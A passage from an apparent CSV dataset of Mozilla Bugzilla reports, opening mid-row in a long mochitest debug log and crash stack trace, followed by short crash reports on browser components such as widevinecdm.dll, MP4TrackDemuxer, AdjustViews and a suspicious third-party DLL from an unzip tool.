0x0] ++DOMWINDOW == 86 (0x12eb81f30) [serial = 980] [outer = 0x13da35220] WARNING: NS_ENSURE_TRUE(sf) failed: file /builds/slave/mozilla-central-macosx64-debug/build/docshell/base/nsDocShell.cpp, line 4933 WARNING: NS_ENSURE_TRUE(sf) failed: file /builds/slave/mozilla-central-macosx64-debug/build/docshell/base/nsDocShell.cpp, line 4933 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 TEST-INFO | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | Console message: [JavaScript Warning: ""Error in parsing value for 'size'.  Declaration dropped."" {file: ""chrome://browser/content/tabview.html"" line: 0}] TEST-INFO | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | Console message: [JavaScript Warning: ""Error in parsing value for 'position'.  Declaration dropped."" {file: ""chrome://browser/content/tabview.html"" line: 0}] TEST-INFO | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | Console message: [JavaScript Warning: ""reference to undefined property ""childWidth"""" {file: ""chrome://browser/content/tabview.js"" line: 3090}] TEST-INFO | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | Console message: [JavaScript Warning: ""reference to undefined property ""columns"""" {file: ""chrome://browser/content/tabview.js"" line: 3090}] ++DOMWINDOW == 87 (0x13624bd30) [serial = 981] [outer = 0x13da35220] TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | The currently selected tab should be the only tab in the groupItemTwo JavaScript strict warning: chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js, line 85: assignment to undeclared variable tabItem WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | The currently selected tab should be the first tab in the groupItemOne WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 WARNING: Overflowed nscoord_MAX in conversion to nscoord: file ../../dist/include/nsCoord.h, line 359 TEST-PASS | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | The currently selected tab should be the only tab in the groupItemTwo ###!!! ABORT: negative duration forbidden: 'duration >= 0.0', file /builds/slave/mozilla-central-macosx64-debug/build/layout/style/nsTransitionManager.cpp, line 119 ElementPropertyTransition::ValuePortionFor [layout/style/nsTransitionManager.cpp:121] nsTransitionManager::ConsiderStartingTransition [layout/style/nsTransitionManager.cpp:669] nsTransitionManager::StyleContextChanged [layout/style/nsTransitionManager.cpp:443] TryStartingTransition [layout/base/nsFrameManager.cpp:727] nsFrameManager::ReResolveStyleContext [layout/base/nsFrameManager.cpp:1226] nsFrameManager::ComputeStyleChangeFor [layout/base/nsFrameManager.cpp:1512] nsCSSFrameConstructor::RestyleElement [layout/base/nsCSSFrameConstructor.cpp:8073] mozilla::css::RestyleTracker::ProcessOneRestyle [layout/base/RestyleTracker.cpp:156] mozilla::css::RestyleTracker::ProcessRestyles [layout/base/RestyleTracker.cpp:218] nsCSSFrameConstructor::ProcessPendingRestyles [layout/base/nsCSSFrameConstructor.cpp:11623] PresShell::FlushPendingNotifications [layout/base/nsPresShell.cpp:4851] nsDocument::FlushPendingNotifications [content/base/src/nsDocument.cpp:6438] nsGenericElement::GetPrimaryFrame [content/base/src/nsGenericElement.cpp:3776] nsGenericElement::GetBoundingClientRect [content/base/src/nsGenericElement.cpp:1740] nsIDOMNSElement_GetBoundingClientRect [dom_quickstubs.cpp:9622] js::CallJSNative [js/src/jscntxtinlines.h:684] js::Interpret [js/src/jsinterp.cpp:4744] js::RunScript [js/src/jsinterp.cpp:665] js::Invoke [js/src/jsinterp.cpp:768] js::InvokeSessionGuard::invoke [js/src/jsinterpinlines.h:562] array_extra [js/src/jsarray.cpp:2723] array_forEach [js/src/jsarray.cpp:2781] js::CallJSNative [js/src/jscntxtinlines.h:684] js::Interpret [js/src/jsinterp.cpp:4744] js::RunScript [js/src/jsinterp.cpp:665] js::Invoke [js/src/jsinterp.cpp:768] js::ExternalInvoke [js/src/jsinterp.cpp:881] js::ExternalInvoke [js/src/jsinterp.h:954] JS_CallFunctionValue [js/src/jsapi.cpp:4908] nsXPCWrappedJSClass::CallMethod [js/src/xpconnect/src/xpcwrappedjsclass.cpp:1694] nsXPCWrappedJS::CallMethod [js/src/xpconnect/src/xpcwrappedjs.cpp:577] PrepareAndDispatch [xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_darwin.cpp:153] ###!!! ABORT: negative duration forbidden: 'duration >= 0.0', file /builds/slave/mozilla-central-macosx64-debug/build/layout/style/nsTransitionManager.cpp, line 119 nsStringStats  => mAllocCount:             66  => mReallocCount:            0  => mFreeCount:              66  => mShareCount:            109  => mAdoptCount:              0  => mAdoptFreeCount:          0 NEXT ERROR TEST-UNEXPECTED-FAIL | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | Exited with code 1 during test run INFO | automation.py | Application ran for: 0:03:06.969180 INFO | automation.py | Reading PID log: /var/folders/H5/H5TD8hgwEqKq9hgKlayjWU+++TM/-Tmp-/tmp_hKnUhpidlog NEXT ERROR PROCESS-CRASH | chrome://mochitests/content/browser/browser/base/content/test/tabview/browser_tabview_bug590606.js | application crashed (minidump found) Operating system: Mac OS X                   10.6.2 10C540 CPU: amd64      family 6 model 23 stepping 10      2 CPUs  Crash reason:  EXC_BAD_ACCESS / KERN_INVALID_ADDRESS Crash address: 0x0  NEXT ERROR Thread 0 (crashed)  0  libmozalloc.dylib!TouchBadMemory [mozalloc_abort.cpp:d7f4a4464ea1 : 64 + 0x5]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x032c4b7d   rsp = 0x5fbd8d00   rbp = 0x5fbd8d00     Found by: given as instruction pointer in context  1  libmozalloc.dylib!mozalloc_abort [mozalloc_abort.cpp:d7f4a4464ea1 : 85 + 0x4]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x032c4bc8   rsp = 0x5fbd8d10   rbp = 0x5fbd8d20     Found by: call frame info  2  XUL!Abort [nsDebugImpl.cpp:d7f4a4464ea1 : 379 + 0x8]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00023096   rsp = 0x5fbd8d30   rbp = 0x5fbd8d40     Found by: call frame info  3  XUL!NS_DebugBreak_P [nsDebugImpl.cpp:d7f4a4464ea1 : 337 + 0xb]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0002350f   rsp = 0x5fbd8d50   rbp = 0x5fbd9190     Found by: call frame info  4  XUL!ElementPropertyTransition::ValuePortionFor [nsTransitionManager.cpp:d7f4a4464ea1 : 119 + 0x35]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00555b9e   rsp = 0x5fbd91a0   rbp = 0x5fbd91e0     Found by: call frame info  5  XUL!nsTransitionManager::ConsiderStartingTransition [nsTransitionManager.cpp:d7f4a4464ea1 : 669 + 0xc]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0055635f   rsp = 0x5fbd91f0   rbp = 0x5fbd9390     Found by: call frame info  6  XUL!nsTransitionManager::StyleContextChanged [nsTransitionManager.cpp:d7f4a4464ea1 : 448 + 0x5a]     rbx = 0x00000000   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00556e07   rsp = 0x5fbd93a0   rbp = 0x5fbd9560     Found by: call frame info  7  XUL!TryStartingTransition [nsFrameManager.cpp:d7f4a4464ea1 : 727 + 0x32]     rbx = 0x3013a8b0   r12 = 0x40197710   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0033d6e7   rsp = 0x5fbd9570   rbp = 0x5fbd95f0     Found by: call frame info  8  XUL!nsFrameManager::ReResolveStyleContext [nsFrameManager.cpp:d7f4a4464ea1 : 1221 + 0x25]     rbx = 0x00000000   r12 = 0x00000001   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0033df64   rsp = 0x5fbd9600   rbp = 0x5fbd9810     Found by: call frame info  9  XUL!nsFrameManager::ComputeStyleChangeFor [nsFrameManager.cpp:d7f4a4464ea1 : 1512 + 0x55]     rbx = 0x00000000   r12 = 0x00000001   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0033ebd0   rsp = 0x5fbd9820   rbp = 0x5fbd9890     Found by: call frame info 10  XUL!nsCSSFrameConstructor::RestyleElement [nsCSSFrameConstructor.cpp:d7f4a4464ea1 : 8072 + 0x47]     rbx = 0x393b1e00   r12 = 0x00000001   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x002fa5a9   rsp = 0x5fbd98a0   rbp = 0x5fbd99d0     Found by: call frame info 11  XUL!mozilla::css::RestyleTracker::ProcessOneRestyle [RestyleTracker.cpp:d7f4a4464ea1 : 156 + 0x41]     rbx = 0x393b1e00   r12 = 0x00000001   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x002e10aa   rsp = 0x5fbd99e0   rbp = 0x5fbd9b20     Found by: call frame info 12  XUL!mozilla::css::RestyleTracker::ProcessRestyles [RestyleTracker.cpp:d7f4a4464ea1 : 240 + 0x2c]     rbx = 0x00000000   r12 = 0x00000001   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x002df9f3   rsp = 0x5fbd9b30   rbp = 0x5fbda7e0     Found by: call frame info 13  XUL!nsCSSFrameConstructor::ProcessPendingRestyles [nsCSSFrameConstructor.cpp:d7f4a4464ea1 : 11620 + 0xf]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x002fa34e   rsp = 0x5fbda7f0   rbp = 0x5fbda810     Found by: call frame info 14  XUL!PresShell::FlushPendingNotifications [nsPresShell.cpp:d7f4a4464ea1 : 4851 + 0xf]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x003789cf   rsp = 0x5fbda820   rbp = 0x5fbda8c0     Found by: call frame info 15  XUL!nsDocument::FlushPendingNotifications [nsDocument.cpp:d7f4a4464ea1 : 6437 + 0x1c]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00639af6   rsp = 0x5fbda8d0   rbp = 0x5fbda920     Found by: call frame info 16  XUL!nsGenericElement::GetPrimaryFrame [nsGenericElement.cpp:d7f4a4464ea1 : 3774 + 0x18]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0067fbfa   rsp = 0x5fbda930   rbp = 0x5fbda960     Found by: call frame info 17  XUL!nsGenericElement::GetBoundingClientRect [nsGenericElement.cpp:d7f4a4464ea1 : 1740 + 0xd]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00692764   rsp = 0x5fbda970   rbp = 0x5fbda9d0     Found by: call frame info 18  XUL!nsIDOMNSElement_GetBoundingClientRect [dom_quickstubs.cpp : 9622 + 0x2d]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00fa09e0   rsp = 0x5fbda9e0   rbp = 0x5fbdac00     Found by: call frame info 19  XUL!js::CallJSNative [jscntxtinlines.h:d7f4a4464ea1 : 684 + 0x10]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01acb098   rsp = 0x5fbdac10   rbp = 0x5fbdac50     Found by: call frame info 20  XUL!js::Interpret [jsinterp.cpp:d7f4a4464ea1 : 4744 + 0x23]     rbx = 0x0bfb93b8   r12 = 0x0bfb93b8   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01911866   rsp = 0x5fbdac60   rbp = 0x5fbdbed0     Found by: call frame info 21  XUL!js::RunScript [jsinterp.cpp:d7f4a4464ea1 : 665 + 0x16]     rbx = 0x00000000   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01924e18   rsp = 0x5fbdbee0   rbp = 0x5fbdbf20     Found by: call frame info 22  XUL!js::Invoke [jsinterp.cpp:d7f4a4464ea1 : 768 + 0x13]     rbx = 0x00000000   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01925c12   rsp = 0x5fbdbf30   rbp = 0x5fbdc010     Found by: call frame info 23  XUL!js::InvokeSessionGuard::invoke [jsinterpinlines.h:d7f4a4464ea1 : 562 + 0x11]     rbx = 0x0bfb9090   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01889bbb   rsp = 0x5fbdc020   rbp = 0x5fbdc080     Found by: call frame info 24  XUL!array_extra [jsarray.cpp:d7f4a4464ea1 : 2723 + 0x12]     rbx = 0x0bfb9090   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x018832f5   rsp = 0x5fbdc090   rbp = 0x5fbdc260     Found by: call frame info 25  XUL!array_forEach [jsarray.cpp:d7f4a4464ea1 : 2780 + 0x14]     rbx = 0x0bfb9060   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01883696   rsp = 0x5fbdc270   rbp = 0x5fbdc290     Found by: call frame info 26  XUL!js::CallJSNative [jscntxtinlines.h:d7f4a4464ea1 : 684 + 0x10]     rbx = 0x0bfb9060   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01acb098   rsp = 0x5fbdc2a0   rbp = 0x5fbdc2e0     Found by: call frame info 27  XUL!js::Interpret [jsinterp.cpp:d7f4a4464ea1 : 4744 + 0x23]     rbx = 0x0bfb9060   r12 = 0x0bfb9060   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01911866   rsp = 0x5fbdc2f0   rbp = 0x5fbdd560     Found by: call frame info 28  XUL!js::RunScript [jsinterp.cpp:d7f4a4464ea1 : 665 + 0x16]     rbx = 0x00000002   r12 = 0x5fbdda30   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01924e18   rsp = 0x5fbdd570   rbp = 0x5fbdd5b0     Found by: call frame info 29  XUL!js::Invoke [jsinterp.cpp:d7f4a4464ea1 : 768 + 0x13]     rbx = 0x00000002   r12 = 0x5fbdda30   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01925c12   rsp = 0x5fbdd5c0   rbp = 0x5fbdd6a0     Found by: call frame info 30  XUL!js::ExternalInvoke [jsinterp.cpp:d7f4a4464ea1 : 881 + 0x11]     rbx = 0x00000008   r12 = 0x5fbdda30   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0192627e   rsp = 0x5fbdd6b0   rbp = 0x5fbdd740     Found by: call frame info 31  XUL!js::ExternalInvoke [jsinterp.h:d7f4a4464ea1 : 954 + 0x37]     rbx = 0x5fbdde28   r12 = 0x5fbdda30   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0185aff9   rsp = 0x5fbdd750   rbp = 0x5fbdd790     Found by: call frame info 32  XUL!JS_CallFunctionValue [jsapi.cpp:d7f4a4464ea1 : 4908 + 0x39]     rbx = 0x5fbdde28   r12 = 0x5fbdda30   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x0185b134   rsp = 0x5fbdd7a0   rbp = 0x5fbdd800     Found by: call frame info 33  XUL!nsXPCWrappedJSClass::CallMethod [xpcwrappedjsclass.cpp:d7f4a4464ea1 : 1694 + 0x3d]     rbx = 0x009c8f00   r12 = 0x00b70dca   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00ef28e7   rsp = 0x5fbdd810   rbp = 0x5fbddeb0     Found by: call frame info 34  XUL!nsXPCWrappedJS::CallMethod [xpcwrappedjs.cpp:d7f4a4464ea1 : 577 + 0x2b]     rbx = 0x36215fe0   r12 = 0x25b19560   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x00ee9a16   rsp = 0x5fbddec0   rbp = 0x5fbddef0     Found by: call frame info 35  XUL!PrepareAndDispatch [xptcstubs_x86_64_darwin.cpp:d7f4a4464ea1 : 153 + 0x36]     rbx = 0x36215fe0   r12 = 0x25b19560   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x01691a7e   rsp = 0x5fbddf00   rbp = 0x5fbde040     Found by: call frame info 36  XUL + 0x16804f2     rbx = 0x36215fe0   r12 = 0x25b19560   r13 = 0x5fbde630   r14 = 0x32cf3020     r15 = 0x0b1e9c00   rip = 0x016904f3   rsp = 0x5fbde050   rbp = 0x5fbde0c0     Found by: call frame info 37  XUL!nsEventListenerManager::HandleEventSubType [nsEventListenerManager.cpp:d7f4a4464ea1 : 1112 + 0x20]     rip = 0x00754974   rsp = 0x5fbde0d0     Found by: stack scanning 38  XUL!nsScriptSecurityManager::GetCxSubjectPrincipal [nsScriptSecurityManager.cpp:d7f4a4464ea1 : 391 + 0x10]     rip = 0x00b7070f   rsp = 0x5fbde150     Found by: stack scanning 39  XUL!XPCJSContextStack::Push [xpcthreadcontext.cpp:d7f4a4464ea1 : 164 + 0x1b]     rip = 0x00ee6a57   rsp = 0x5fbde190     Found by: stack scanning 40  XUL!IsContextOnStack [nsContentUtils.cpp:d7f4a4464ea1 : 2875 + 0x17]     rip = 0x0060b01b   rsp = 0x5fbde1c0     Found by: stack scanning 41  XUL!nsXPConnect::Push [nsXPConnect.cpp:d7f4a4464ea1 : 2485 + 0x1b]     rip = 0x00ea8be8   rsp = 0x5fbde200     Found by: stack scanning 42  XUL!nsCxPusher::DoPush [nsContentUtils.cpp:d7f4a4464ea1 : 3013 + 0x17]     rip = 0x0060b2ab   rsp = 0x5fbde240     Found by: stack scanning 43  XUL!nsCxPusher::Push [nsContentUtils.cpp:d7f4a4464ea1 : 2996 + 0xc]     rip = 0x0060b3c9   rsp = 0x5fbde280     Found by: stack scanning 44  XUL!nsHtml5AttributeName::initializeStatics [mozalloc.h : 228 + 0x0]     rip = 0x00b194d0   rsp = 0x5fbde290     Found by: stack scanning 45  XUL!nsCxPusher::Push [nsContentUtils.cpp:d7f4a4464ea1 : 2943 + 0x11]     rip = 0x0060b599   rsp = 0x5fbde2b0     Found by: stack scanning",Intermittent crash in browser/base/content/test/tabview/browser_tabview_bug590606.js | Exited with code 1 during test run
25468,"Created attachment 399375 testcase  This look like a simple null pointer dereference bug, and it might be related to bug 508247; although, that patch did not fix this bug.",Crash [@ nsSVGUtils::GetCTM] with getScreenCTM()
25469,"This bug is for crash report bp-347969b3-b777-467c-8b9f-1786e0190826.  ``` Top 10 frames of crashing thread:  0 oly64.dll oly64.dll@0xe43c  1 ntdll.dll RtlProcessFlsData  2 ntdll.dll LdrShutdownThread  3 ntdll.dll RtlExitUserThread  4 kernelbase.dll FreeLibraryAndExitThread  5 ucrtbase.dll crt_at_quick_exit  6 ucrtbase.dll o_strcat_s  7  @0x3611012a  8 mozglue.dll static void patched_BaseThreadInitThunk mozglue/build/WindowsDllBlocklist.cpp:617 9 ntdll.dll RtlUserThreadStart   ```  these crashes with involvement of the module oly64.dll/oly.dll are showing up increasingly since firefox 68. this seems to come from an unpacking tool ""FYunZip"" from the company ""浙江自贸区耀光网络科技有限公司"", so it's predominantly users from zh-CN builds that are affected.  some more information about the software: https://any.run/report/d94f55f0c15d14d1706205a043ef9515c9a11ecfde374a43953bf65a4b689c55/e273acf5-59bb-4aad-8d5d-c40498b53b72  i don't have attempted to reproduce this myself, however i find it strange that an unzipping tool would require hooking into the browser process. should we attempt to blocklist this dll preemptively?",Crash in oly64.dll (FYunZip)
25491,"I got the following mail from Bugzilla. The Activity log page shows similar info.  <example> http://bugzilla.mozilla.org/show_bug.cgi?id=62197  ben.bucksch@beonex.com changed:             What    |Removed                     |Added ----------------------------------------------------------------------------              Status|NEW                         |RESOLVED            Keywords|polish                      |helpwanted           QAContact|stephend@netscape.com |lchiang@netscape.com Resolution|                            |DUPLICATE             Summary|[RFE] Display only partial  |[FEATURE]Tree view of news                    |names in Newsgroup Tree     |subscriptions    ------- Additional Comments From ben.bucksch@beonex.com 2002-01-03 07:40 ------- yes.  *** This bug has been marked as a duplicate of 38931 ***  </example>  The problem is that the only change I made was to type ""yes"" in the Comment field, select resolve dup and enter a bug number to dup again. I did none of the other changes, namely the keyword, summary and qa changes. I guess it was Neil who did that before, but Bugzilla attributes it to me.  I haven't seen this bug before - what I did see before was that several modification notifications were rolled into one, but with correct attribution, like <example> a@b.com changed: ...  c@d.com changed: ... <example>",Data munged: Dupping bug carries over fields from other bug
25538,This bug was filed from the Socorro interface and is report bp-f9db7cd3-a0cf-4506-a232-9d4be0180204. =============================================================  Seen while looking at Android nightly stats: http://bit.ly/2o4NNfJ. Two similar signatures. All the comments seem to mention scrolling.  Comments: I was just scrolling through the page.   Possible regression range based on Build ID: https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=92b6195a9367dec27fbf3efbe7824cf163aa017a&tochange=cac3a4e6000d7079f8cf0118a5c509b2527b3289  Top 10 frames of crashing thread:  0  @0xfffdc3a8  1 libxul.so AdjustViews layout/generic/nsGfxScrollFrame.cpp:2454 2 libxul.so nsFrame::GetChildLists layout/generic/nsFrame.cpp:1948 3 libxul.so mozilla::layout::FrameChildListIterator::FrameChildListIterator layout/generic/FrameChildList.cpp:17 4 libxul.so AdjustViews layout/generic/nsGfxScrollFrame.cpp:2474 5 libxul.so nsIFrame::MarkNeedsDisplayItemRebuild layout/generic/nsFrame.cpp:1038 6 libxul.so mozilla::ScrollFrameHelper::ScrollVisual layout/generic/nsGfxScrollFrame.cpp:2652 7 libxul.so mozilla::ScrollFrameHelper::ScrollToImpl layout/generic/nsGfxScrollFrame.cpp:2879 8 dalvik-main space 1 (deleted) dalvik-main space 1 @0x13e8c0fe  9 libxul.so mozilla::ScrollFrameHelper::GetScrolledRect layout/generic/nsGfxScrollFrame.cpp:6066  =============================================================,Crash in AdjustViews
25554,"Immediately crashes whenever opening a page using widevine. For example, https://integration.widevine.com/player   This bug was filed from the Socorro interface and is report bp-354fe061-4d68-4085-806c-b3af60190113. =============================================================  Top 10 frames of crashing thread:  0  @0x6c853080  1 widevinecdm.dll widevinecdm.dll@0x12667e  2 widevinecdm.dll widevinecdm.dll@0x11efbc  3 widevinecdm.dll widevinecdm.dll@0x11ef8f  4 widevinecdm.dll widevinecdm.dll@0x11ef8f  5 widevinecdm.dll widevinecdm.dll@0x113ca6  6 widevinecdm.dll widevinecdm.dll@0x112c56  7 widevinecdm.dll widevinecdm.dll@0x10a977  8 xul.dll mozilla::gmp::ChromiumCDMChild::RecvUpdateSession dom/media/gmp/ChromiumCDMChild.cpp:578 9 xul.dll mozilla::gmp::PChromiumCDMChild::OnMessageReceived ipc/ipdl/PChromiumCDMChild.cpp:895  =============================================================",Crash in widevinecdm.dll | mozilla::gmp::ChromiumCDMChild::RecvUpdateSession
25558,"This bug is for crash report bp-dca146ba-a4d7-4105-8371-99da00190501.  Seen while looking at nightly crash stats - 2 Mac crashes so far, single install both in 20190430215337.  Possible regression range based on Build ID: https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=420e18a75314b8123b515d8a93cbacd145ecb03c&tochange=11b4d70a2b5d6373f5ec8fa01ca48a1c7bc1829e  Bug 1540580? ni on :byrce ``` Top 10 frames of crashing thread:  0 XUL mozilla::MP4TrackDemuxer::MP4TrackDemuxer dom/media/mp4/MP4Demuxer.cpp:349 1 XUL mozilla::MP4Demuxer::Init dom/media/mp4/MP4Demuxer.cpp:351 2 XUL mozilla::detail::ProxyFunctionRunnable<mozilla::MediaFormatReader::DemuxerProxy::Init xpcom/threads/MozPromise.h:1420 3 XUL mozilla::TaskQueue::Runner::Run xpcom/threads/TaskQueue.cpp:199 4 XUL nsThreadPool::Run xpcom/threads/nsThreadPool.cpp:244 5 XUL non-virtual thunk to nsThreadPool::Run xpcom/threads/nsThreadPool.cpp 6 XUL nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1180 7 XUL NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 8 XUL mozilla::ipc::MessagePumpForNonMainThreads::Run ipc/glue/MessagePump.cpp:333 9 XUL nsThread::ThreadFunc xpcom/threads/nsThread.cpp:454  ```",Crash in [@ mozilla::MP4TrackDemuxer::MP4TrackDemuxer]
25604,"This bug was filed from the Socorro interface and is report bp-475f6182-0ca4-4f4a-ac00-40e830180104. =============================================================  Top 10 frames of crashing thread:  0 libmozglue.so MOZ_CrashPrintf mfbt/Assertions.cpp:63 1 libxul.so InvalidArrayIndex_CRASH xpcom/ds/nsTArray.cpp:26 2 libxul.so nsTArray_Impl<BloatEntry*, nsTArrayInfallibleAllocator>::ElementAt  3 libxul.so mozilla::detail::RunnableFunction<>::Run xpcom/ds/ArrayIterator.h:86 4 libxul.so nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1040 5 libxul.so NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:510 6 libxul.so mozilla::ipc::MessagePumpForNonMainThreads::Run ipc/glue/MessagePump.cpp:364 7 libxul.so MessageLoop::Run ipc/chromium/src/base/message_loop.cc:326 8 libxul.so nsThread::ThreadFunc xpcom/threads/nsThread.cpp:423 9 libnss3.so _pt_root nsprpub/pr/src/pthreads/ptthread.c:201  =============================================================  I see 16 crashes from 17 installations, all on Android Nightly, which is fairly frequent for Android Nightly. This seems to have started on the 20180103230310 build, so maybe it is just a signature change? Judging from the line numbers for the runnable in the stack, this might be related to MediaCache::CloseStreamsForPrivateBrowsing().",Crash in InvalidArrayIndex_CRASH | nsTArray_Impl<T>::ElementAt | mozilla::detail::RunnableFunction<T>::Run
25609,This bug was filed from the Socorro interface and is  report bp-91968d58-e742-48a4-96dc-e65ec2170201. =============================================================  Low volume crash that has been happening on and off for the last month or so. The line that crashes was added by bug 1315386.,Crash in nsUrlClassifierDBService::Observe
25618,There's one crash in 22.0a1/20130323: bp-3d2fe647-3ed4-4743-be4d-4a2242130324.  java.lang.NullPointerException 	at org.mozilla.fennec.WebApp.onTabChanged(WebApp.java:236) 	at org.mozilla.gecko.Tabs$4.run(Tabs.java:518) 	at android.os.Handler.handleCallback(Handler.java:725) 	at android.os.Handler.dispatchMessage(Handler.java:92) 	at android.os.Looper.loop(Looper.java:137) 	at android.app.ActivityThread.main(ActivityThread.java:5226) 	at java.lang.reflect.Method.invokeNative(Native Method) 	at java.lang.reflect.Method.invoke(Method.java:511) 	at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:795) 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:562) 	at dalvik.system.NativeStart.main(Native Method)  More reports at: https://crash-stats.mozilla.com/report/list?signature=java.lang.NullPointerException%3A+at+org.mozilla.fennec.WebApp.onTabChanged%28WebApp.java%29,java.lang.NullPointerException: at org.mozilla.fennec.WebApp.onTabChanged(WebApp.java)
